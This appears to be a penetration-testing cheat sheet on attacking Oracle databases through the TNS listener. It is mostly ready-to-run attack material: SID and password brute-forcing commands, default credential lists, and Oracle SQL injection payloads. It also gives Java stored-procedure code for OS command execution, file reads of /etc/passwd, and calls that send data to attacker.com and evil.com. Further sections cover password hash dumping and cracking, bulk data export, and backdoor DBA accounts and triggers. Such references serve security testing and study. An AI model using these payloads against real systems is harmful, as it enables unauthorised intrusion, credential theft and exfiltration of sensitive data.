# Oracle Listener

**`Default Ports: 1521 (Listener), 1630 (iSQL*Net)`**

**Oracle Database** is a multi-model database management system produced and marketed by Oracle Corporation. It's one of the most widely used enterprise relational database management systems, particularly in large corporations and government organizations. Oracle Database offers advanced features including stored procedures, triggers, and the ability to execute Java code within the database. Due to its complexity and enterprise deployment, Oracle databases often contain highly sensitive data and can be challenging to secure properly.

### Connect <a href="#connect" id="connect"></a>

#### Using sqlplus (Official Client) <a href="#using-sqlplus-official-client" id="using-sqlplus-official-client"></a>

sqlplus is Oracle's traditional command-line interface for database interaction:

```
# Local connection
sqlplus username/password

# Remote connection
sqlplus username/password@target.com:1521/ORCL

# As SYSDBA (administrative connection)
sqlplus username/password@target.com:1521/ORCL as sysdba

# Connection string format
sqlplus username/password@//target.com:1521/SERVICE_NAME

# Non-interactive mode
echo "SELECT version FROM v\$instance;" | sqlplus -S username/password@target.com:1521/ORCL
```

#### Using sqldeveloper (GUI) <a href="#using-sqldeveloper-gui" id="using-sqldeveloper-gui"></a>

```
Connection Name: target_db
Username: system
Password: password
Hostname: target.com
Port: 1521
SID/Service: ORCL
```

#### Using tnslsnr (TNS Listener) <a href="#using-tnslsnr-tns-listener" id="using-tnslsnr-tns-listener"></a>

The TNS Listener is the gateway to Oracle databases and handles connection requests:

```
# Check listener status (if you have access)
lsnrctl status

# Get listener version
lsnrctl version

# Services registered with listener
lsnrctl services
```

### Recon <a href="#recon" id="recon"></a>

#### Service Detection with Nmap <a href="#service-detection-with-nmap" id="service-detection-with-nmap"></a>

Use Nmap to detect Oracle Database services and identify server capabilities.

```
nmap -p 1521,1630 target.com
```

#### Banner Grabbing <a href="#banner-grabbing" id="banner-grabbing"></a>

Connect to the TNS Listener to gather version and service information.

**Using netcat**

```
# Using netcat
nc -vn target.com 1521

# Get TNS version
echo "(CONNECT_DATA=(COMMAND=version))" | nc target.com 1521
```

**Using nmap**

```
# Using nmap
nmap -p 1521 -sV target.com
```

**Using tnslsnr**

```
# TNS ping
tnslsnr target.com 1521
```

#### SID Enumeration <a href="#sid-enumeration" id="sid-enumeration"></a>

The SID (System Identifier) is required to connect to Oracle databases and can be brute-forced.

**Common Default SIDs**

```
# Common default SIDs
ORCL, XE, XEXDB, PROD, DEV, TEST, DB11G, DB12C
```

**Using sidguesser**

```
# Using sidguesser
./sidguesser.pl target.com
```

**Using odat**

```
# Using odat
odat sidguesser -s target.com -p 1521
```

**Using Metasploit**

```
# Using Metasploit
use auxiliary/scanner/oracle/sid_enum
set RHOSTS target.com
run
```

**Using Nmap**

```
# Using Nmap
nmap -p 1521 --script oracle-sid-brute target.com
```

### Enumeration <a href="#enumeration" id="enumeration"></a>

#### Version Detection <a href="#version-detection" id="version-detection"></a>

Once connected, you can gather detailed Oracle version information to identify vulnerabilities.

```
-- Oracle version
SELECT * FROM v$version;

-- Banner information
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';

-- Instance name and status
SELECT instance_name, status, version FROM v$instance;

-- Database name
SELECT name, created FROM v$database;

-- Platform information
SELECT platform_name FROM v$database;
```

#### User Enumeration <a href="#user-enumeration" id="user-enumeration"></a>

Understanding user accounts and their privileges is critical for privilege escalation.

```
-- List all users
SELECT username FROM dba_users;
SELECT username FROM all_users;

-- Current user
SELECT user FROM dual;
SELECT sys_context('USERENV', 'CURRENT_USER') FROM dual;

-- User privileges
SELECT * FROM user_sys_privs;
SELECT * FROM user_role_privs;

-- DBA users
SELECT username FROM dba_users WHERE username IN (SELECT grantee FROM dba_role_privs WHERE granted_role='DBA');

-- Users with specific privileges
SELECT grantee FROM dba_sys_privs WHERE privilege='CREATE SESSION';
```

#### Table and Schema Enumeration <a href="#table-and-schema-enumeration" id="table-and-schema-enumeration"></a>

Discovering database structure helps locate sensitive data.

```
-- List all tables owned by current user
SELECT table_name FROM user_tables;

-- List all tables in database (requires privileges)
SELECT owner, table_name FROM all_tables;
SELECT owner, table_name FROM dba_tables;

-- Columns in specific table
SELECT column_name, data_type FROM all_tab_columns WHERE table_name='USERS';

-- Find sensitive columns
SELECT table_name, column_name FROM all_tab_columns 
WHERE column_name LIKE '%PASSWORD%' 
   OR column_name LIKE '%PASS%'
   OR column_name LIKE '%SECRET%'
   OR column_name LIKE '%TOKEN%';

-- Count rows in tables
SELECT table_name, num_rows FROM all_tables WHERE owner='SCHEMA_NAME';
```

#### Privilege Enumeration <a href="#privilege-enumeration" id="privilege-enumeration"></a>

Understanding available privileges reveals potential attack paths.

```
-- System privileges for current user
SELECT * FROM session_privs;

-- All system privileges
SELECT * FROM dba_sys_privs WHERE grantee='USERNAME';

-- Role privileges
SELECT * FROM dba_role_privs WHERE grantee='USERNAME';

-- Table privileges
SELECT * FROM dba_tab_privs WHERE grantee='USERNAME';

-- Check for DBA role
SELECT granted_role FROM user_role_privs WHERE granted_role='DBA';
```

#### Password Hash Extraction <a href="#password-hash-extraction" id="password-hash-extraction"></a>

Oracle password hashes can be extracted and cracked offline (requires DBA privileges).

```
-- Extract password hashes (Oracle 10g)
SELECT name, password FROM sys.user$;

-- Extract password hashes (Oracle 11g+)
SELECT name, spare4 FROM sys.user$;

-- Both versions
SELECT username, password, spare4 FROM dba_users;

-- Password versions
SELECT username, password_versions FROM dba_users;
```

### Attack Vectors <a href="#attack-vectors" id="attack-vectors"></a>

#### Default Credentials <a href="#default-credentials" id="default-credentials"></a>

Oracle installations often retain default credentials for system accounts.

```
# Common default credentials
sys:change_on_install
system:manager
system:oracle
scott:tiger
dbsnmp:dbsnmp
sysman:sysman
admin:admin

# Try connection
sqlplus sys/change_on_install@target.com:1521/ORCL as sysdba
sqlplus system/manager@target.com:1521/ORCL
```

#### Brute Force Attack <a href="#brute-force-attack" id="brute-force-attack"></a>

If default credentials fail, you can attempt brute force attacks.

**Using Hydra**

```
# Using hydra
hydra -L users.txt -P passwords.txt target.com oracle-listener
```

**Using odat**

```
# Using odat
odat passwordguesser -s target.com -d ORCL -U users.txt -P passwords.txt
```

**Using Metasploit**

```
# Using Metasploit
use auxiliary/scanner/oracle/oracle_login
set RHOSTS target.com
set SID ORCL
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

**Using patator**

```
# Using patator
patator oracle_login host=target.com sid=ORCL user=FILE0 password=FILE1 \
  0=users.txt 1=passwords.txt
```

#### TNS Poisoning <a href="#tns-poisoning" id="tns-poisoning"></a>

TNS (Transparent Network Substrate) can be exploited to intercept database connections.

```
# If you can modify tnsnames.ora or control DNS
# Redirect database connections to attacker's server

# Attacker sets up rogue Oracle listener
# Captures credentials when clients connect

# Using odat
odat tnspoison -s target.com --poison
```

#### SQL Injection in Oracle Context <a href="#sql-injection-in-oracle-context" id="sql-injection-in-oracle-context"></a>

Oracle has unique SQL injection techniques and syntax.

```
-- Error-based injection
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--

-- Union-based injection
' UNION SELECT NULL,banner,NULL FROM v$version--

-- Boolean-based blind
' AND (SELECT COUNT(*) FROM all_users WHERE username='SYS')=1--

-- Time-based blind
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',10)--

-- Out-of-band (DNS)
' || UTL_INADDR.GET_HOST_ADDRESS('attacker.com')||'
' || UTL_HTTP.REQUEST('http://attacker.com/'||user||'') ||'
```

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

#### Command Execution via Java <a href="#command-execution-via-java" id="command-execution-via-java"></a>

Oracle can execute Java code within the database, providing powerful command execution capabilities:

**Grant Java Permissions**

```
BEGIN
DBMS_JAVA.grant_permission('SCOTT', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute');
DBMS_JAVA.grant_permission('SCOTT', 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
DBMS_JAVA.grant_permission('SCOTT', 'SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
END;
/
```

**Create Java Class**

```
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "Execute" AS
import java.io.*;
public class Execute {
  public static String run(String cmd) {
    try {
      StringBuffer output = new StringBuffer();
      Process p = Runtime.getRuntime().exec(cmd);
      BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
      String line;
      while ((line = reader.readLine())!= null) {
        output.append(line + "\n");
      }
      return output.toString();
    } catch (Exception e) {
      return e.toString();
    }
  }
}
/
```

**Create PL/SQL Wrapper**

```
CREATE OR REPLACE FUNCTION run_cmd(p_cmd IN VARCHAR2) RETURN VARCHAR2
AS LANGUAGE JAVA NAME 'Execute.run(java.lang.String) return java.lang.String';
/
```

**Execute Commands**

```
SELECT run_cmd('whoami') FROM dual;
SELECT run_cmd('id') FROM dual;
```

#### File System Access <a href="#file-system-access" id="file-system-access"></a>

```
-- Read file using UTL_FILE
DECLARE
  f UTL_FILE.FILE_TYPE;
  s VARCHAR2(200);
BEGIN
  f := UTL_FILE.FOPEN('/etc', 'passwd', 'R');
  LOOP
    UTL_FILE.GET_LINE(f, s);
    DBMS_OUTPUT.PUT_LINE(s);
  END LOOP;
  EXCEPTION WHEN NO_DATA_FOUND THEN UTL_FILE.FCLOSE(f);
END;
/

-- Write file
DECLARE
  f UTL_FILE.FILE_TYPE;
BEGIN
  f := UTL_FILE.FOPEN('/tmp', 'backdoor.txt', 'W');
  UTL_FILE.PUT_LINE(f, 'malicious content');
  UTL_FILE.FCLOSE(f);
END;
/

-- Using external table
CREATE DIRECTORY temp_dir AS '/tmp';
CREATE TABLE shell_output (line VARCHAR2(1000))
ORGANIZATION EXTERNAL (
  TYPE ORACLE_LOADER
  DEFAULT DIRECTORY temp_dir
  ACCESS PARAMETERS (RECORDS DELIMITED BY NEWLINE)
  LOCATION ('command_output.txt')
);
```

#### Network Operations <a href="#network-operations" id="network-operations"></a>

```
-- HTTP requests (SSRF)
SELECT UTL_HTTP.REQUEST('http://169.254.169.254/latest/meta-data/') FROM dual;

-- DNS lookup (data exfiltration)
SELECT UTL_INADDR.GET_HOST_ADDRESS('data.attacker.com') FROM dual;

-- TCP connections
SELECT UTL_TCP.OPEN_CONNECTION('attacker.com', 4444) FROM dual;

-- Port scanning
SELECT UTL_TCP.IS_AVAILABLE('192.168.1.100', 22) FROM dual;

-- SMTP (send email)
SELECT UTL_MAIL.SEND(
  sender => 'oracle@target.com',
  recipients => 'attacker@evil.com',
  subject => 'Exfiltrated Data',
  message => 'Sensitive information here'
) FROM dual;
```

#### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

```
-- Check if user has DBA role
SELECT granted_role FROM user_role_privs WHERE granted_role='DBA';

-- Grant DBA to user (if you have privileges)
GRANT DBA TO username;

-- Create new DBA user
CREATE USER backdoor IDENTIFIED BY P@ssw0rd123!;
GRANT DBA TO backdoor;
GRANT CREATE SESSION TO backdoor;

-- Exploit password verification function
-- Some Oracle versions have exploitable password functions
```

#### Password Hash Cracking <a href="#password-hash-cracking" id="password-hash-cracking"></a>

```
# Extract hashes (from SQL query shown earlier)
sqlplus system/password@target.com:1521/ORCL <<EOF
SET PAGESIZE 0
SET FEEDBACK OFF
SELECT username||':'||password||':'||spare4 FROM dba_users;
EXIT
EOF > oracle_hashes.txt

# Crack Oracle 10g hashes (DES-based)
hashcat -m 3100 oracle_10g_hashes.txt rockyou.txt

# Crack Oracle 11g hashes (SHA-1 based)
hashcat -m 112 oracle_11g_hashes.txt rockyou.txt

# Crack Oracle 12c hashes (PBKDF2-SHA-512)
hashcat -m 12300 oracle_12c_hashes.txt rockyou.txt
```

#### Data Exfiltration <a href="#data-exfiltration" id="data-exfiltration"></a>

```
# Export entire schema
expdp username/password@target.com:1521/ORCL \
  schemas=SCHEMA_NAME \
  directory=DATA_PUMP_DIR \
  dumpfile=exfiltrated.dmp \
  logfile=export.log

# Export specific table
expdp username/password@target.com:1521/ORCL \
  tables=SCHEMA.SENSITIVE_TABLE \
  directory=DATA_PUMP_DIR \
  dumpfile=table_dump.dmp

# SQL-based export
sqlplus username/password@target.com:1521/ORCL <<EOF
SET PAGESIZE 0
SET FEEDBACK OFF
SET HEADING OFF
SPOOL /tmp/users.txt
SELECT username||':'||password_hash FROM users;
SPOOL OFF
EXIT
EOF
```

#### Persistence <a href="#persistence" id="persistence"></a>

```
-- Create backdoor user with DBA privileges
CREATE USER sysmonitor IDENTIFIED BY "ComplexP@ss123!";
GRANT DBA TO sysmonitor;
GRANT CREATE SESSION TO sysmonitor;
GRANT UNLIMITED TABLESPACE TO sysmonitor;

-- Create backdoor stored procedure
CREATE OR REPLACE PROCEDURE backdoor_exec(cmd IN VARCHAR2) AS
  output VARCHAR2(4000);
BEGIN
  -- Execute command via Java
  SELECT run_cmd(cmd) INTO output FROM dual;
  DBMS_OUTPUT.PUT_LINE(output);
END;
/

-- Create trigger for persistence
CREATE OR REPLACE TRIGGER backdoor_trigger
AFTER LOGON ON DATABASE
BEGIN
  -- Log connections or execute code
  INSERT INTO audit_log VALUES (USER, SYSDATE);
END;
/
```

### Oracle PL/SQL Procedures <a href="#oracle-plsql-procedures" id="oracle-plsql-procedures"></a>

| Procedure        | Description     | Security Impact        |
| ---------------- | --------------- | ---------------------- |
| `DBMS_JAVA`      | Java execution  | Command execution      |
| `UTL_FILE`       | File operations | Read/write files       |
| `UTL_HTTP`       | HTTP requests   | SSRF attacks           |
| `UTL_TCP`        | TCP connections | Port scanning          |
| `UTL_SMTP`       | Send email      | Data exfiltration      |
| `UTL_INADDR`     | DNS resolution  | Network recon          |
| `DBMS_SCHEDULER` | Job scheduling  | Persistence            |
| `DBMS_XMLGEN`    | XML generation  | Information disclosure |

### Common Oracle System Tables <a href="#common-oracle-system-tables" id="common-oracle-system-tables"></a>

| View             | Description        | Requires Privileges |
| ---------------- | ------------------ | ------------------- |
| `v$version`      | Version info       | No                  |
| `v$instance`     | Instance details   | No                  |
| `dba_users`      | All database users | DBA                 |
| `dba_tables`     | All tables         | DBA                 |
| `dba_sys_privs`  | System privileges  | DBA                 |
| `dba_role_privs` | Role privileges    | DBA                 |
| `all_users`      | Accessible users   | No                  |
| `user_tables`    | User's tables      | No                  |
| `sys.user$`      | User credentials   | DBA                 |

### Useful Tools <a href="#useful-tools" id="useful-tools"></a>

| Tool          | Description            | Primary Use Case        |
| ------------- | ---------------------- | ----------------------- |
| sqlplus       | Oracle CLI             | Direct database access  |
| SQL Developer | GUI client             | Database management     |
| odat          | Oracle exploitation    | Automated testing       |
| OWASP         | Oracle assessment      | Security scanning       |
| Metasploit    | Exploitation framework | Automated exploitation  |
| oscanner      | Oracle scanner         | Vulnerability discovery |
| tnscmd        | TNS enumeration        | Listener interaction    |

### Security Misconfigurations <a href="#security-misconfigurations" id="security-misconfigurations"></a>

* ❌ Default credentials (sys:change\_on\_install, system:manager)
* ❌ Weak passwords on system accounts
* ❌ TNS Listener without password
* ❌ Excessive privileges granted to PUBLIC
* ❌ Java permissions too permissive
* ❌ UTL\_\* packages accessible to non-DBA users
* ❌ No encryption (using port 1521 without SSL)
* ❌ Outdated Oracle version with known CVEs
* ❌ Listener exposed to internet
* ❌ Default SID names (ORCL, XE)
* ❌ Audit logging disabled
* ❌ OS authentication enabled without proper security

<br>
